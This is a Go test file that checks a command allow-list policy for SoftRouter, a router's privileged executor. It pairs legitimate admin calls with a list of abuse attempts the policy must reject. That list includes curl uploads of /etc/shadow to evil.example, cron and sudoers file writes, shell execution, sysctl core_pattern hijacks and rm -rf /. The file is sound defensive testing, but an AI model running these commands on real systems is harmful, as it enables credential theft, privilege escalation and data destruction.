package main

import "testing"

type shape struct {
	cmd  string
	args []string
}

func s(cmd string, args ...string) shape { return shape{cmd, args} }

// Every argument shape SoftRouter's code actually passes to the privileged
// executor (extracted from all call sites). None of these may be refused.
func TestPolicyAcceptsEveryLegitimateCallShape(t *testing.T) {
	legit := []shape{
		s("nft", "-j", "list", "ruleset"),
		s("nft", "list", "table", "inet", "softrouter"),
		s("nft", "-f", "/tmp/softrouter-rules-123.nft"),
		s("nft", "-c", "-f", "/tmp/chk.nft"),
		s("nft", "delete", "rule", "inet", "softrouter", "input", "handle", "67"),
		s("nft", "delete", "table", "inet", "deadman"),
		s("nft", "add", "table", "inet", "softrouter"),
		s("ip", "link", "set", "enp3s0f0", "up"),
		s("ip", "route", "replace", "default", "via", "192.168.0.1", "dev", "enp3s0f0"),
		s("ip", "route", "replace", "default", "scope", "global", "nexthop", "via", "1.2.3.4", "dev", "eth0", "weight", "1"),
		s("ip", "-6", "addr", "show"),
		s("ip", "addr", "add", "192.168.1.1/24", "dev", "br0"),
		s("ip", "rule", "add", "from", "10.0.0.0/24", "table", "100"),
		s("tc", "qdisc", "add", "dev", "eth0", "handle", "ffff:", "ingress"),
		s("tc", "-s", "qdisc", "show", "dev", "eth0"),
		s("tc", "filter", "add", "dev", "eth0", "parent", "ffff:", "matchall", "action", "mirred", "egress", "redirect", "dev", "ifb0"),
		s("systemctl", "restart", "dnsmasq"),
		s("systemctl", "enable", "AdGuardHome"),
		s("systemctl", "stop", "unbound"),
		s("systemctl", "reload", "frr"),
		s("systemctl", "daemon-reload"),
		s("systemctl", "is-active", "wg-quick@wg0"),
		s("systemctl", "restart", "openvpn-client@pia"),
		s("systemctl", "enable", "openvpn-server@server"),
		s("systemctl", "show", "openvpn-client@pia", "--property=ActiveEnterTimestamp"),
		s("systemctl", "start", "pihole-FTL"),
		s("systemctl", "reload-or-restart", "radvd"),
		s("systemctl", "restart", "systemd-resolved"),
		s("systemctl", "is-active", "adguardhome"),
		s("sysctl", "-w", "net.ipv4.ip_forward=1"),
		s("sysctl", "-w", "net.netfilter.nf_conntrack_acct=1"),
		s("sysctl", "-w", "net.ipv4.conf.all.route_localnet=1"),
		s("modprobe", "bonding"),
		s("modprobe", "nf_conntrack"),
		s("wg", "genkey"),
		s("wg", "pubkey"),
		s("wg", "syncconf", "wg0", "/etc/wireguard/wg0.conf"),
		s("cloudflared", "--version"),
		s("cloudflared", "service", "uninstall"),
		s("cloudflared", "service", "install", "eyJhIjoiYWJj-_=="),
		s("ping", "-I", "enp3s0f0", "-c", "2", "-W", "2", "8.8.8.8"),
		s("ping", "-c", "2", "-W", "2", "8.8.8.8"),
		s("ping", "-c", "4", "-W", "2", "example.com"),
		s("traceroute", "-w", "2", "-m", "15", "example.com"),
		s("journalctl", "-u", "softrouter", "-n", "50", "--no-pager"),
		s("curl", "-fsSL", "https://pkg.cloudflare.com/cloudflare-main.gpg", "-o", "/tmp/cloudflare.gpg"),
		s("curl", "-f", "-s", "-L", "-o", "/etc/softrouter/country-ip-lists/US.txt", "https://www.ipdeny.com/ipblocks/data/aggregated/us-aggregated.zone"),
		s("curl", "-s", "-m", "10", "ifconfig.me"),
		s("pihole", "enable"),
		s("pihole", "-v"),
		s("cscli", "decisions", "list", "-o", "json"),
		s("tail", "-n", "100", "/var/log/suricata/eve.json"),
		s("tail", "-n", "1000", "/var/log/suricata/eve.json"),
		s("./easyrsa", "init-pki"),
		s("./easyrsa", "build-ca", "nopass"),
		s("./easyrsa", "build-server-full", "server", "nopass"),
		s("./easyrsa", "gen-dh"),
		s("./easyrsa", "build-client-full", "john_phone", "nopass"),
		s("./easyrsa", "--batch", "revoke", "john_phone"),
		s("./easyrsa", "gen-crl"),
		s("openvpn", "--version"),
		s("openvpn", "--genkey", "--secret", "ta.key"),
		s("cp", "-r", "/usr/share/easy-rsa", "/etc/openvpn/easy-rsa"),
		s("cp", "/etc/openvpn/easy-rsa/pki/ca.crt", "/etc/openvpn/server/"),
		s("cp", "/etc/openvpn/easy-rsa/pki/crl.pem", "/etc/openvpn/server/"),
		s("cp", "/tmp/softrouter-dns-privacy.conf", "/etc/systemd/resolved.conf.d/softrouter-dns-privacy.conf"),
		s("cp", "/tmp/miniupnpd-123.conf", "/etc/miniupnpd/miniupnpd.conf"),
		s("speedtest-cli", "--json", "--secure"),
		s("uptime", "-p"),
		s("mkdir", "-p", "/etc/systemd/resolved.conf.d"),
		s("suricata-update", "--no-merge"),
		s("ss", "-tunap"),
		s("netstat", "-tunap"),
		s("dnsmasq", "-v"),
		s("dnsmasq", "--test", "--conf-file=/tmp/softrouter-dnsmasq-123.conf"),
		s("dnsmasq", "-C", "/run/softrouter/fallback-dnsmasq.conf", "-x", "/run/softrouter/fallback-dnsmasq.pid"),
		s("radvd", "--configtest", "--config=/tmp/softrouter-radvd-1.conf"),
		s("conntrack", "-L"),
		s("conntrack", "-L", "-o", "extended"),
		s("update.sh", "--branch", "main"),
		s("update.sh", "--branch", "Dev", "--force"),
		s("systemd-run", "--unit=softrouter-update-1763100000", "--no-block", "--service-type=oneshot",
			"-p", "WorkingDirectory=/home/tim/SoftwareRouter/SoftwareRouter",
			"-p", "Environment=PATH=/usr/local/go/bin:/usr/sbin:/usr/bin:/sbin:/bin",
			"-p", "Environment=HOME=/root", "-p", "Environment=GOTOOLCHAIN=local",
			"-p", "Environment=GOCACHE=/root/.cache/go-build", "-p", "Environment=GOPATH=/root/go",
			"/home/tim/SoftwareRouter/SoftwareRouter/update.sh", "--branch", "Dev", "--force"),
	}
	for _, c := range legit {
		if err := validateCommand(c.cmd, c.args); err != nil {
			t.Errorf("legitimate call refused: %s %v -> %v", c.cmd, c.args, err)
		}
	}
}

// Abuse attempts. Each is a way a root-equivalent binary could be turned into
// arbitrary code execution, file read/write, or exfiltration.
func TestPolicyRejectsAbuse(t *testing.T) {
	bad := []shape{
		// code execution
		s("systemd-run", "--unit=x", "/bin/sh", "-c", "id"),
		s("systemd-run", "--unit=softrouter-update-1", "--no-block", "--service-type=oneshot", "/tmp/evil.sh"),
		s("systemd-run", "--unit=softrouter-update-1", "--no-block", "--service-type=oneshot", "-p", "ExecStartPre=/bin/id", "/x/update.sh", "--branch", "main"),
		s("ip", "netns", "exec", "ns", "id"),
		s("ip", "vrf", "exec", "v", "id"),
		s("ip", "-b", "/tmp/batch"),
		s("tc", "exec", "bpf"),
		s("systemctl", "edit", "ssh"),
		s("systemctl", "start", "ssh"),
		s("systemctl", "poweroff"),
		s("systemctl", "set-environment", "X=1"),
		s("systemctl", "restart", "dnsmasq", "--force"),
		s("systemctl", "enable", "--now", "evil"),
		s("openvpn", "--config", "/tmp/evil.ovpn"),
		s("openvpn", "--genkey", "--secret", "/etc/passwd"),
		s("./easyrsa", "--vars=/tmp/evil", "init-pki"),
		s("update.sh", "--branch", "evil"),
		s("update.sh", "--branch", "main", "--extra"),
		s("nft", "-i"),
		s("nft", "--file", "/etc/shadow"),
		s("nft", "-f", "/etc/passwd"),
		// arbitrary file read / write
		s("cp", "/etc/shadow", "/tmp/x"),
		s("cp", "/tmp/evil", "/etc/sudoers.d/evil"),
		s("cp", "/tmp/evil", "/etc/cron.d/evil"),
		s("cp", "-r", "/", "/etc/openvpn/server"),
		s("cp", "-r", "/usr/share/easy-rsa", "/etc"),
		s("cp", "/tmp/a", "/tmp/b", "/etc/openvpn/server/"),
		s("tail", "-n", "10", "/etc/shadow"),
		s("tail", "-f", "/var/log/suricata/eve.json"),
		s("tail", "-n", "999999", "/var/log/suricata/eve.json"),
		s("journalctl", "-u", "ssh", "-n", "10", "--no-pager"),
		s("journalctl", "-n", "10"),
		s("mkdir", "-p", "/etc/sudoers.d"),
		s("mkdir", "-p", "/root/.ssh"),
		s("mkdir", "/etc/openvpn/x"),
		s("curl", "-o", "/etc/cron.d/x", "https://evil.example/x"),
		s("curl", "-fsSL", "https://evil.example/x", "-o", "/etc/passwd"),
		s("curl", "file:///etc/shadow"),
		s("curl", "http://evil.example/x"),
		s("curl", "-T", "/etc/shadow", "https://evil.example/"),
		s("curl", "-K", "/tmp/cfg", "https://x"),
		s("curl", "--config", "/tmp/cfg", "https://x"),
		s("curl", "-d", "@/etc/shadow", "https://evil.example/"),
		s("curl", "https://a.example", "https://b.example"),
		// argument injection
		s("ping", "-f", "-c", "2", "-W", "2", "8.8.8.8"),
		s("ping", "-c", "2", "-W", "2", "-fflood"),
		s("ping", "-c", "2", "-W", "2", "-I"),
		s("ping", "-c", "99", "-W", "2", "8.8.8.8"),
		s("traceroute", "-w", "2", "-m", "15", "-g"),
		s("sysctl", "-w", "kernel.core_pattern=|/tmp/x"),
		s("sysctl", "-w", "kernel.modprobe=/tmp/x"),
		s("sysctl", "-w", "net.ipv4.ip_forward=2"),
		s("sysctl", "-p", "/tmp/evil"),
		s("modprobe", "-r", "nf_tables"),
		s("modprobe", "/tmp/evil.ko"),
		s("wg", "syncconf", "wg0", "/etc/shadow"),
		s("wg", "setconf", "wg0", "/tmp/x"),
		s("dnsmasq", "--conf-file=/etc/shadow", "--test"),
		s("dnsmasq", "--dhcp-script=/tmp/x"),
		s("dnsmasq", "-C", "/tmp/evil.conf", "-x", "/tmp/pid"),
		s("radvd", "--config=/etc/shadow", "--configtest"),
		s("cscli", "machines", "delete", "x"),
		s("cscli", "decisions", "add", "-i", "1.2.3.4"),
		s("pihole", "-a", "-p", "x"),
		s("cloudflared", "tunnel", "run"),
		s("cloudflared", "service", "install", "bad token with spaces"),
		s("conntrack", "-F"),
		s("speedtest-cli", "--share"),
		s("uptime", "-s"),
		s("suricata-update", "--reload-command", "/tmp/x"),
		// not allow-listed / removed
		s("bash", "-c", "id"),
		s("sh", "-c", "id"),
		s("suricata", "-c", "/tmp/evil"),
		s("rm", "-rf", "/"),
		s("/bin/sh", "-c", "id"),
		s("/tmp/update.sh", "--branch", "main"),
	}
	for _, c := range bad {
		if err := validateCommand(c.cmd, c.args); err == nil {
			t.Errorf("ABUSE ACCEPTED: %s %v", c.cmd, c.args)
		}
	}
}

func TestEveryAllowedCommandHasAPolicy(t *testing.T) {
	for cmd := range allowedCommands {
		if _, ok := commandPolicies[cmd]; !ok {
			t.Errorf("allowedCommands contains %q with no argument policy", cmd)
		}
	}
}
